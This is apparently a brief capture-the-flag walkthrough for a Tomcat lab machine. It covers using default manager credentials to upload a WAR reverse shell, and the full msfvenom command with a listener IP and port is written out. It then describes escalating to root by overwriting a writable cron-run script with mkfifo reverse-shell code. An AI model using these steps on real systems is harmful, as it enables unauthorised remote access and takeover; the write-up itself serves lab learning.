Initial scans show 22,8080,8009
8080 is a tomcat server. dirsearch shows some manager/html
Once we go there, it asks for login. if we do cancel, it shows the default us:pass in msg
Login using that, and there is a section to upload war files
crate war payload
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.34.38 LPORT=1235 -f war -o rshell.war`
upload it, and deploy
open the page, and 
reverse shell!
in the /home/jack dir, there's a file that invokes shell, and that thing is run in crontab as rot
we have write rights over it
replace with mkfifo code, and wait for cron to do its thing
root Shell!